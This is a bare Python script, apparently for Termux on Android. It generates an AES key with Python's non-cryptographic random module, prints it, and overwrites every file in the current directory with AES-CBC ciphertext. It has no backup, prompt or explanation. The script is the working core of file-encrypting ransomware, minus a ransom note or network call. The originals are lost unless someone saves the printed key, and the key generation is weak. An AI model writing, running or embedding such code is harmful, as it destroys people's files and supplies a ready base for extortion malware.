#!/data/data/com.termux/files/usr/bin/python
import os
import glob
import random
import string

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend


def random_key(length=32):
    # AES requires 16, 24, or 32 bytes
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))


def encrypt_file(file_path, key):
    backend = default_backend()
    iv = os.urandom(16)

    cipher = Cipher(algorithms.AES(key.encode()), modes.CBC(iv), backend=backend)
    encryptor = cipher.encryptor()

    with open(file_path, 'rb') as f:
        data = f.read()

    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

    with open(file_path, 'wb') as f:
        # store IV + ciphertext so decryption is possible
        f.write(iv + encrypted_data)


def main():
    key = random_key()
    print(f'Encryption key: {key}')

    for file_path in glob.glob('*'):
        if os.path.isfile(file_path):
            print(f'Encrypting {file_path}...')
            encrypt_file(file_path, key)


if __name__ == '__main__':
    main()
